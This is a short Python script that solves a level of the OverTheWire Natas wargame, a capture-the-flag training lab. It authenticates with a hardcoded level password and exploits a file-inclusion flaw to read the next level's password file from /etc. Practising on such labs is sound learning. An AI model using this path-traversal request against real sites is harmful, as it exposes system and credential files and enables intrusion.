import requests

url= "http://natas7.natas.labs.overthewire.org"

s= requests.Session()
s.auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
r= s.get('http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8')

print(r.text)